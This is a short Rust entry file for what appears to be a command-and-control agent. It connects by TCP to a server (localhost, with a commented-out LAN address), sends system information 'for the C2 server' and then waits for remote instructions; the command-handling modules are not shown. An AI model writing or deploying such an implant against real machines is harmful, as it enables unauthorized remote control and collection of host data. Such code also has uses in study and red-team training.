use std::io::{self};
use std::net::TcpStream;
use crate::worker::utils::{listening_for_instructions, send_sys_info};

mod config;
mod worker;

fn main() -> io::Result<()> {
    // let ip = String::from("192.168.1.70");
    let ip = "127.0.0.1".to_string();
    let port = "7878".to_string();
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
    println!("[I] Connected to server {}:{}.", ip, port);

    // Send basic sysinfo for the C2 server
    send_sys_info(&mut stream);

    listening_for_instructions(&mut stream).unwrap();

    Ok(())
}

